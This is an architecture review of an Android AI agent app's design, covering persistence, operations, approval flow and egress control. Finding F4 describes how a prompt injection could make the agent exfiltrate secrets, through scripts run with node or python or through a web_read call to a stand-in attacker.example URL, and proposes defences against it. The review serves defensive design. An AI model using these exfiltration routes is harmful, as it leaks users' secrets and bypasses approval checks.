---
type: architecture-review
lens: rubric (good-spine checklist)
target: _bmad-output/initiative-lumynoid/architecture-lumynoid/architecture-lumynoid.md
context:
  - _bmad-output/initiative-lumynoid/initiative-lumynoid.md
  - _bmad-output/initiative-lumynoid/tickets/tickets.toml
date: '2026-11-14'
verdict: revise-before-epics
---

# Rubric Review — Architecture Spine Lumynoid v1

## Verdict

The spine is strong at runtime: the execution path, the tool contract, the confirmation gate, the LLM port and module boundaries are pinned well. It is **not ready to bind seven epics** for four reasons. (1) Persistence topology and schema migration are silent, even though every epic ships a real release (`v0.N`) to real users. (2) The operational envelope (rootfs upgrades, crash diagnostics, recovering interrupted tasks, the signing/upgrade path) is mostly silent. (3) AD-3 and AD-7 collide when a task waits for approval. (4) The shell clause of AD-9 cannot be enforced, so R10 is not actually guaranteed. Fix these, then the spine can be handed to the epics.

## Scorecard

| Criterion | Result | Notes |
| --- | --- | --- |
| Fixes real divergence points, none missed | Partial | Strong for runtime. Misses persistence topology/migration, interrupted-task recovery, notification/deep-link ownership, and the LlmChunk signals that epic 4 needs (F1, F3, F5, F7) |
| Every Rule is enforceable and prevents its divergence | Partial | AD-9 (shell + host-level) cannot be enforced (F4). AD-4 and AD-5 contradict each other on the quota indicator (F5). AD-2 vs. connection test (F5) |
| Nothing in Deferred lets epics diverge | Partial | "Retention/export/backup" is effectively decided today by the Android default `allowBackup=true` (F6). The rest is safe |
| Named tech is plausible-current | Mostly | Plausible for Nov 2026. Small notes: material3 1.4.0 vs. BOM 2026.08, Readability4J is stale, AGP 9.5.0 needs checking (F8) |
| Covers R1–R12 | Yes (map complete) | R10 coverage is weak because of F4. R6 is missing battery/autostart guidance and notification channels (single-epic, acceptable) |
| Every dimension owned by this altitude is decided/deferred/open | No | Operational envelope: data migration, rootfs upgrade, crash diagnostics, upgrade/signing path, process-death recovery are silent (F1, F2, F3) |
| No rationale leaking into the spine | Small | A few rationale phrases inside Rules/Deferred (F8) |
| Each AD passes "incompatible + non-obvious + real trade-off" | Mostly | AD-8, AD-18 and parts of AD-16 are seed or single-epic (F8) |
| Mermaid is valid | Yes | All 4 blocks are syntactically valid (manual inspection; see the Mermaid section) |

## Findings

### F1 — CRITICAL: Persistence topology and schema migration are silent, and AD-5 contradicts AD-1

**Problem.**
- AD-5 gives write ownership of `ProviderConfig`/`Secret` to `:llm`, `ScheduledTask` to `:scheduler`, and `InstalledSkill`/`SkillPolicy` to `:skills`. Room lives in `:data`, though (Paradigm table, source tree: `data/ # Room (event log, conversation, config)`). AD-1 forbids adapters from depending on each other. So `:llm` can neither use `:data`'s DAOs nor add an entity to `:data`'s `RoomDatabase` without `:data` depending on `:llm`. The epics will pick one of three incompatible solutions: one shared DB in `:data` with all entities, a separate Room DB per module, or a repository port in `:core`.
- Every epic ships an APK to GitHub Releases that real users install, so each release can bring a schema change. There is no rule on: `exportSchema` plus committed schema JSON, manual `Migration` vs. `AutoMigration`, a ban on `fallbackToDestructiveMigration` in release, or migration tests. Epics 3 and 4 run in parallel after epic 2 (tickets.toml), so they will **collide on DB version numbers**.
- `TaskEvent` is stored as JSON "with a schema version" (Conventions), and epics may add subtypes (Structural Seed). There is no rule on **upcasting** old events or on how a projection built by another epic handles a subtype it doesn't know (crash vs. skip vs. generic render).

**Fix.** Add an AD called "Persistence & migration":
1. Pick one topology. Recommendation: **one** `RoomDatabase` in `:data` implementing repository ports declared in `:core` (`ConversationStore`, `ProviderConfigStore`, `ScheduleStore`, `SkillStore`, ...). AD-5 "ownership" then means owning the port contract and the right to write through it, not owning the Room module.
2. `exportSchema = true`, schemas committed under `data/schemas/`, every version bump uses an explicit `Migration` tested with `MigrationTestHelper`, and `fallbackToDestructiveMigration` is banned in release.
3. DB version numbers are serialized at merge (whichever epic merges second rebases and takes N+1). Guard it with a CI check that the version is monotonic and every version has a migration.
4. The `TaskEvent` decoder is tolerant: an unknown `type` decodes to `TaskEvent.Unknown(raw)`, which projections render generically. `schemaVersion` is upcast in `:data` before reaching `:core`.

### F2 — HIGH: The operational envelope is silent (rootfs upgrades, crash diagnostics, upgrade/signing path)

**Problem.** The Deployment section covers topology and CI/CD only. Missing:
- **Rootfs/userland upgrades.** AD-14 sets "download once, checksum embedded in the build". When an app version changes the rootfs (distro picked by the epic-2 spike, a newer node for `baw` in epic 6, a proot security fix), nothing says how it's replaced: side-by-side rootfs versions, migrating `/workspace/<conversationId>` and `/opt/skills`, or reinstalling npm skills after an ABI/libc change. Epics 2 and 6 will diverge here, since `/opt/skills` is shared.
- **Crash/diagnostics.** AD-17 bans proprietary crash reporters, and the Logging convention forbids prompts in logcat, but **no replacement is chosen**. Every epic will either invent its own or have none. That leaves the epic-7 tester and the 7-day test on Xiaomi/Samsung with no evidence when something fails.
- **Upgrade path and signing.** "F-Droid: reproducible build from tag" doesn't say whether F-Droid ships the APK with the **upstream signature** (reproducible-build verification) or signs it with F-Droid's key. If F-Droid's key, users can't move between GitHub Releases and F-Droid without uninstalling, which loses all data (no backup, see F6). There's also no `applicationIdSuffix` for debug, so debug and release can't be installed side by side on a test device.

**Fix.** Add an AD called "Operations" that pins:
1. Rootfs is versioned as `filesDir/rootfs/<rootfsVersion>/`, separate from `filesDir/workspace/` and `filesDir/skills/` (bind-mounted to `/workspace` and `/opt/skills`). Changing `rootfsVersion` installs the new rootfs alongside the old one, then deletes the old one. Installed skills keep a manifest so they can be reinstalled automatically when the rootfs version changes.
2. Diagnostics: a local `UncaughtExceptionHandler` writes redacted reports (no secrets/prompts) to `filesDir/crash/`, and a "Send diagnostics" screen shares them via a user-initiated share intent. ACRA with a mail/share sender is F-Droid-compatible and could be named here.
3. Signing: release uses one key for GitHub and F-Droid (F-Droid reproducible build with the upstream signature, per `AllowedAPKSigningKeys`). Debug uses `applicationIdSuffix ".debug"`.
4. Pick an explicit owner for each (epic-chat-dan-provider for 2 and 3, epic-agent-shell for 1).

### F3 — HIGH: AD-3 x AD-7 x AD-14: a task waiting for approval holds the single runner slot, keeps the FGS/userland alive, and process death has no recovery semantics

**Problem.**
- AD-3: only one task at a time. AD-7: a `SCHEDULED` task needing confirmation "pauses ... until it expires". While paused, the task still holds the only slot. Every chat the user sends gets `QUEUED`, possibly for hours. The FGS stays in the foreground the whole time (against the spirit of C5, "FGS only while there's a task"), and the userland stays up because AD-14 only stops it when the task "finishes or fails" (C6, phantom process killer). The **expiry duration** isn't set either, so epics 2 and 3 will pick different numbers.
- AD-4 calls persisted events "the crash-tolerance boundary" but doesn't say **what happens after** process death (OOM, app update, swipe-kill on Xiaomi): is a task without a terminal event resumed, failed, or left hanging forever? A pending `ApprovalRequested`? Epic 2 (runner) and epic 3 (scheduled task killed overnight) will answer differently.
- AD-16 re-arms alarms on `BOOT_COMPLETED`/`TIME_SET`/`TIMEZONE_CHANGED`, but not on `MY_PACKAGE_REPLACED` (every epic ships an upgrade) or `SCHEDULE_EXACT_ALARM_PERMISSION_STATE_CHANGED` (revoking the permission cancels every exact alarm).

**Fix.** Amend AD-3/AD-7/AD-14:
1. Add a `AWAITING_APPROVAL` state: the runner **releases the slot**, stops the userland (state stays only on disk/workspace), and stops the FGS when the queue is empty. `ApprovalPort.resolve` re-submits the task's continuation to the FIFO queue.
2. Set the approval expiry constant in the spine (for example 12 hours for `SCHEDULED` and none for `CHAT`, or whatever value is chosen), which then emits `TaskFailed(APPROVAL_EXPIRED)`.
3. Recovery rule: when `AgentService`/the app starts, every `Task` without a terminal event that isn't `AWAITING_APPROVAL` gets `TaskFailed(INTERRUPTED)` appended (v1 doesn't resume automatically). Scheduled tasks get no automatic retry, or name the retry policy here.
4. Add `MY_PACKAGE_REPLACED` and `SCHEDULE_EXACT_ALARM_PERMISSION_STATE_CHANGED` to the re-arm triggers in AD-16.

### F4 — HIGH: AD-9 can't be enforced for shell and web_read, so R10 isn't guaranteed

**Problem.**
- "A shell command that calls a network client outside the allowlist is rated `EGRESS`" relies on statically inspecting the command string. The agent can write `x.js` (LOCAL_WRITE) and then run `node x.js`, `python x.py`, `npm run`, or a package's `postinstall`. All of these open sockets with no network client visible in the command. An injection in a web page/tool output can still exfiltrate without a card, which breaks R10 and the injection criterion in "Done when". The Rule doesn't prevent the divergence it claims to.
- `web_read` is judged per **host**. The attacker's page is itself in the search results, so `web_read https://attacker.example/?d=<secret>` passes as non-EGRESS.
- The example "(e.g. installing packages from a registry)" makes `npm install` ambiguous: it's either always EGRESS (a card for every `npm install` in a coding task) or allowlisted. The answer determines the R4 UX in epic 2 and the `baw` installation in epic 6.

**Fix.** Rewrite AD-9 as enforcement at the runtime boundary, not text inspection:
1. Userland networking is **off by default** and enforced in the launcher. proot is ptrace-based, so `socket`/`connect` to AF_INET/AF_INET6 can be denied by an extension or a syscall filter. It turns on only for a single `exec` approved through an `EGRESS` card, or for allowlisted commands bound to fixed hosts (npm registry) through a local proxy that rejects other hosts.
2. The `web_read` check compares the **full URL** (scheme+host+path+query) to URLs that appear literally in the user message or `web_search` results. Any URL built or modified by the LLM is rated `EGRESS`.
3. Fix the status of `npm install` in the spine (allowlisted to the registry through a proxy, or EGRESS). The detailed allowlist can still be deferred to epic 2.
4. If (1) isn't feasible after the epic-2 spike, record it as an **Open question** with explicit risk acceptance. Don't leave it as a Rule that looks like it protects.

### F5 — MEDIUM: The LlmPort contract is missing the signals that epic 4 needs, and the source of the quota indicator contradicts itself

**Problem.**
- AD-12: "every provider switch is recorded as `TaskEvent.ProviderSwitched`". But AD-4 says **only TaskRunner** writes events, and the router lives in `:llm` behind `LlmPort`. `LlmChunk` (AD-11) has no variant for reporting a switch or token usage. Epic 2 will freeze `LlmChunk` without it, and epic 4 will have to change the port or write events itself.
- AD-4 lists the "provider indicator" as a projection of the event log and claims to prevent "quota status computed from a second source". AD-5 puts "remaining quota" in `RouterState` owned by `:llm`, which is that second source.
- AD-2: "the UI never calls `LlmPort` directly". The connection test (R2) and reading the remaining-quota endpoint (R12) aren't LLM turns and don't belong to any task. Epic 1 will break AD-2 or create fake tasks.

**Fix.** Add `LlmChunk.ProviderSwitched(from, to, reason)` and `LlmChunk.Usage(tokensIn, tokensOut)` to the AD-11 model now. TaskRunner turns them into events. Set the live quota indicator to read `RouterState` (and remove "provider indicator" from AD-4's list), while the event log only records history. Add `ProviderAdminPort { testConnection(); fetchQuota() }` in `:llm`, explicitly exempt from AD-2.

### F6 — MEDIUM: "Backup" is deferred but is effectively decided by Android's default; secrets are limited to `:llm` even though other modules need them

**Problem.**
- Deferred: "Retention, export, and backup ... decide before epic-rilis-publik". With targetSdk 37 the default is `allowBackup=true`, so the Room DB holding every transcript and full tool output (including `baw` output) goes into Google Drive backup / device-to-device transfer starting in epic 1. AD-15 only excludes the key. This is a manifest decision for `:app` that epic 1 makes today, possibly by default.
- AD-15: "Only the `:llm` adapter decrypts" and AD-5 `Secret` → `:llm`. Yet the topology names Brave/SearXNG (`:web`) as optional backends that may need a key. Epic 5 will either break AD-15 or route the key through `:llm`.

**Fix.** Pin in the spine now: `android:allowBackup="false"` (or `dataExtractionRules` that exclude the DB and secret store) until the backup decision is made. Move the secret store into a `SecretPort` in `:core` (implemented in `:data`/`:app`) with per-consumer `SecretRef` and the same AD-15 rule: never in events, context, userland env, or backup.

### F7 — MEDIUM: Ownership of TaskRunner/AgentService in epic 1, notifications, and deep links is unclear

**Problem.**
- AD-2 forces plain chat through `TaskRunner` in `AgentService` (FGS `specialUse`) to avoid a "separate chat path that's torn down later". So **epic 1 has to build** TaskRunner + AgentService. Yet AD-5 names the owner as epic-agent-shell, and tickets.toml puts the "task runner in the FGS" in epic 2. The epic-1 team will read the spine one way and the epic-2 team another.
- Notification channels (FGS status, scheduled-task results, approval requests) and the deep link that opens an `ApprovalCard` from a notification are used by epics 2 and 3. No convention for channel IDs, notification IDs, or the navigation route.

**Fix.** Add a line to AD-2/AD-5: "epic-chat-dan-provider builds TaskRunner + AgentService without tools; epic-agent-shell extends them with tools/gate and owns them from then on". Add Conventions rows: channel IDs `lumynoid.task`, `lumynoid.result`, `lumynoid.approval` (owner `:app`) and the deep-link scheme `lumynoid://task/{taskId}[/approval/{eventId}]`.

### F8 — LOW: Rationale leaking, seed ADs, versions, assumptions

- **Rationale inside Rules/Deferred:** AD-8 "Combined with AD-7, an injection at most produces a tool call that still passes through the gate" is justification, not a rule. Stack "avoid 1.23.x, has a CVE" (keep the constraint `>=1.24`, drop the reason). Deferred "Risk: Android 15 seccomp report ..." belongs in the research. Trim these.
- **Seed/not cross-epic ADs:** AD-8 is mostly what the tool-calling protocol does anyway (tool output = `tool` role). Merge its one real rule ("the runner never parses output text for instructions") into AD-7. AD-18 (offline preview) is only built by epic 2 (R11), so move it to the epic-level architecture. AD-16 is mostly internal to epic 3; the cross-epic part is already AD-2. Keep only "`schedule_create` through `SchedulerPort`" and "one conversation per scheduled task".
- **Versions (plausible for Nov 2026, not verified online):** material3 1.4.0 already shipped in 2025, so with BOM 2026.08 it was probably already 1.5.x; take it from the BOM and don't pin it separately. Readability4J 1.0.8 has been unmaintained for a long time, so record a fallback (pure jsoup extraction) or accept the risk. Check that AGP 9.5.0 really is stable as of the build date. `proot` is GPL-2.0, so the license decision (Deferred) and AD-17 should mention the obligation to provide source for the bundled binary.
- **`[ASSUMPTION]` in a binding spine:** `minSdk 29` and `app.lumynoid` are assumptions, and the initiative still lists minSdk as an open question. Move them to an "Open questions" section with a deadline (before the first story of epic 1), because `applicationId` can't be changed after the first release.
- **No "Open questions" section:** the initiative lists the Kotlin agent library (Koog/LangChain4j) as waiting on architecture. AD-11 effectively answers it ("no SDK/agent framework"). Close that open question explicitly in the initiative or record it in the spine.

## Requirement coverage R1–R12

| R | Covered | Gap |
| --- | --- | --- |
| R1 | AD-2, AD-15, AD-17 | — |
| R2 | AD-11, AD-12, AD-15 | Connection test conflicts with AD-2 (F5) |
| R3 | AD-2, AD-4 | Conversation/event migrations across releases (F1) |
| R4 | AD-3, AD-6, AD-7, AD-9, AD-14 | `npm install` status, rootfs upgrades (F2, F4) |
| R5 | AD-6, AD-8, AD-9, AD-13 | Host-level web_read check (F4) |
| R6 | AD-2, AD-3, AD-7, AD-16 | Approval wait/expiry, re-arm on upgrade, notification channels (F3, F7) |
| R7 | AD-6, AD-7, AD-13, AD-14 | Skill persistence across rootfs upgrades (F2) |
| R8 | AD-7, AD-10 | — |
| R9 | AD-4, AD-13 | Unknown event subtypes in the log projection (F1) |
| R10 | AD-7, AD-8, AD-9 | Shell egress can't be enforced (F4) |
| R11 | AD-10, AD-18 | — |
| R12 | AD-11, AD-12, AD-13 | ProviderSwitched/Usage signals, quota source (F5) |

## Deferred check

| Item | Safe to defer? |
| --- | --- |
| Rootfs distro, proot version | Yes (spike at the start of epic 2, before epic 6). The **upgrade mechanism** isn't deferrable, though (F2) |
| Shell heuristics/allowlist | Yes for the details. The enforcement mechanism isn't (F4) |
| SkillPolicy, rotation/cooldown policy, provider presets, final search backend, exact-alarm fallback | Yes: single-epic, bounded by an AD |
| FGS `specialUse` policy | Yes, but it's a single point of failure for AD-2. Add a fallback note (e.g. `shortService`/`dataSync`) if the epic-1 check fails |
| Retention, export, backup | **No** for backup (F6). Yes for retention/export |
| UI language, OSS license | Yes (note proot GPL, F8) |
| Play, 2027 verification, PSE | Yes |
| GenUI/Telegram/ChatGPT | Yes |

## Mermaid

Inspected manually (running a mermaid parser in this environment was denied):

1. `graph TD` modules: valid. Labels containing parentheses are quoted.
2. `sequenceDiagram`: valid (aliases with `/` and `()` are fine in `participant ... as`, extra `:` in message text is allowed, `loop`/`alt`/`end` are balanced). Semantic nit: `assess`/`execute` aren't wrapped in `opt ada tool_calls`, so the diagram suggests a tool runs on every turn.
3. `erDiagram`: valid. `ROUTER_STATE`, `SKILL_POLICY`, and the storage relationships don't appear yet; add them once F1 is decided.
4. `graph LR` deployment: valid (`subgraph HP pengguna` with a space is allowed, colons/slashes inside `[...]` are fine). Semantically it's missing the crash/diagnostics path and the signing/F-Droid path once F2 is decided.
